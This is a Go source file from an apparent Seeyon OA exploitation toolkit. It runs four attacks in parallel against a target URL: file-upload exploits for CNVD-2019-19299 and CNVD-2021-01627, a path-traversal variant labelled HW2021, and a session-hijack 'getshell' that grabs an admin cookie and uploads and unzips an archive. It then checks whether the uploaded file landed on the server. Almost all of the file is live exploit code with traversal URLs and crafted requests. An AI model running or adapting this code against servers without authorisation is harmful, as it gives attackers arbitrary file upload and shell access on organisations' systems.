package VulScan

import (
	"SeeyonExploit/CNVD201919299"
	"SeeyonExploit/CNVD202101627"
	"SeeyonExploit/SessionGetshell"
	"SeeyonExploit/utils"
	"fmt"
	"net/http"
	"os"
	"sync"
	"time"
)

func VulScan(url string) {
	url = utils.FixUrl(url)

	ch1 := make(chan *http.Response)
	ch2 := make(chan *http.Response)
	ch3 := make(chan *http.Response)
	ch4 := make(chan *http.Response)

	var wg sync.WaitGroup
	wg.Add(4)

	var mutex sync.Mutex

	go func() {
		mutex.Lock()
		//检测CNVD201919299
		//生成测试文件
		md5str := utils.GenerateTestFile()
		ServerFileName1 := md5str + ".txt.txt" //上传到服务端后的文件名

		//得到payload
		path := "/seeyon/htmlofficeservlet"
		target1 := url + path
		payload1 := CNVD201919299.GenPayload(ServerFileName1, ServerFileName1, path)
		_ = os.Remove(ServerFileName1)
		go func() {
			ch1 <- utils.PostData(target1, payload1, nil)
		}()
		select {
		case <-ch1:
			Verification(url+"/seeyon/"+ServerFileName1, "CNVD201919299")
		case <-time.After(5 * time.Second): //设置超时
			Verification(url+"/seeyon/"+ServerFileName1, "CNVD201919299")
		}
		mutex.Unlock()
		wg.Done()
	}()

	go func() {
		mutex.Lock()
		//生成测试文件
		md5str := utils.GenerateTestFile()
		ServerFileName2 := md5str + ".txt.txt" //上传到服务端后的文件名

		//检测CNVD202101627
		target2 := url + "/seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip"
		payload2 := CNVD202101627.GeneratePayload(ServerFileName2, ServerFileName2, "../webapps/seeyon/")
		_ = os.Remove(ServerFileName2)
		data := "managerMethod=validate&arguments=" + payload2
		header := make(map[string]string)
		header["Content-Type"] = "application/x-www-form-urlencoded"
		header["User-Agent"] = "secure test"

		go func() {
			ch2 <- utils.PostData(target2, data, header)
		}()
		select {
		case <-ch2:
			Verification(url+"/seeyon/"+ServerFileName2, "CNVD202101627")
		case <-time.After(5 * time.Second):
			Verification(url+"/seeyon/"+ServerFileName2, "CNVD202101627")
		}
		mutex.Unlock()
		wg.Done()
	}()

	go func() {
		mutex.Lock()
		//生成测试文件
		md5str := utils.GenerateTestFile()
		ServerFileName3 := md5str + ".txt.txt" //上传到服务端后的文件名

		//检测HW2021
		dir3 := "/seeyon/ajax.do;Jsessionid=getAjaxDataServlet?method=ajaxAction&managerMethod=validate&managerName=formulaManager&requestCompress=gzip&S=ajaxColManager&M=colDelLock&arguments="
		target3 := url + dir3
		payload3 := CNVD202101627.GeneratePayload(ServerFileName3, ServerFileName3, "../webapps/seeyon/")
		_ = os.Remove(ServerFileName3)
		client := &http.Client{}
		req, err := http.NewRequest("GET", target3+payload3, nil)
		req.Header.Set("User-Agent", "secure test")
		resp3, err := client.Do(req)
		go func() {
			ch3 <- resp3
		}()
		if err != nil {
			recover()
		}
		select {
		case <-ch3:
			Verification(url+"/seeyon/"+ServerFileName3, "HW2021")
		case <-time.After(5 * time.Second):
			Verification(url+"/seeyon/"+ServerFileName3, "HW2021")
		}
		mutex.Unlock()
		wg.Done()
	}()

	go func() {
		mutex.Lock()
		//生成测试文件
		md5str := utils.GenerateTestFile()
		ServerFileName4 := md5str + ".txt.txt" //上传到服务端后的文件名

		//检测SessionGetshell
		session := SessionGetshell.GetSession(url)
		if session == "" {
			fmt.Println("[-]获取管理员Cookie失败")
		}
		id := SessionGetshell.UploadZip(url, session, ServerFileName4, ServerFileName4)
		_ = os.Remove(ServerFileName4)
		if id != "" {
			go func() {
				ch4 <- SessionGetshell.UnzipAttachment(url, session, id)
			}()
			select {
			case <-ch4:
				Verification(url+"/seeyon/common/designer/pageLayout/"+ServerFileName4, "SessionGetshell")
			case <-time.After(5 * time.Second):
				Verification(url+"/seeyon/common/designer/pageLayout/"+ServerFileName4, "SessionGetshell")
			}

		}
		mutex.Unlock()
		wg.Done()
	}()
	wg.Wait()
}
